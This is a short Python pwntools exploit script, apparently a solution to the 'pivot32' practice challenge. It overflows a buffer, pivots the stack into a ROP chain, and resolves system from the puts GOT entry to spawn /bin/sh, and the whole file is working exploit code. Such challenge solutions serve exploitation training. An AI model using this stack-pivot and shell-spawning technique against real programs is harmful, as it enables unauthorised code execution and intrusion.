from pwn import *

DEBUG = False

elf = ELF("./pivot32")
gs = """
b *pwnme+198
"""
if DEBUG:
    io = gdb.debug(elf.path, gdbscript=gs)
else:
    io = process(elf.path)

# found using ropper
pop_ebp = 0x0804889b        # pop ebp; ret;
leave = 0x080485f5          # leave; ret;
pop_eax = 0x0804882c        # pop eax; ret;
read_memo_eax = 0x08048830  # mov eax, dword ptr [eax]; ret;
pop_ebx = 0x080484a9        # pop ebx; ret;
add_eax_ebx = 0x08048833    # add eax, ebx; ret;
call_eax = 0x080485f0       # call eax;

system_offset = -0x2c4a0 & 0xffffffff # relative to puts.
puts_got_plt = 0x804a01c

rop_chain = b'AAAA'  # starts with junk for the leave instruction (pops a value to ebp).
rop_chain += p32(pop_eax) + p32(puts_got_plt) + p32(read_memo_eax)
rop_chain += p32(pop_ebx) + p32(system_offset)
rop_chain += p32(add_eax_ebx) + p32(call_eax) 

io.recvuntil("a place to pivot: ")
pivot_addr = int(io.recvline().strip(), 16)
print("pivot_addr:", hex(pivot_addr))
io.recvuntil("> ")
system_param = p32(pivot_addr + len(rop_chain) + 4)
io.sendline(rop_chain + system_param + b'/bin/sh\0')
io.recvuntil("> ")

offset = 44
payload = cyclic(offset) + p32(pop_ebp) + p32(pivot_addr) + p32(leave)
io.sendline(payload)

io.recvuntil("Thank you!\n")
io.interactive()
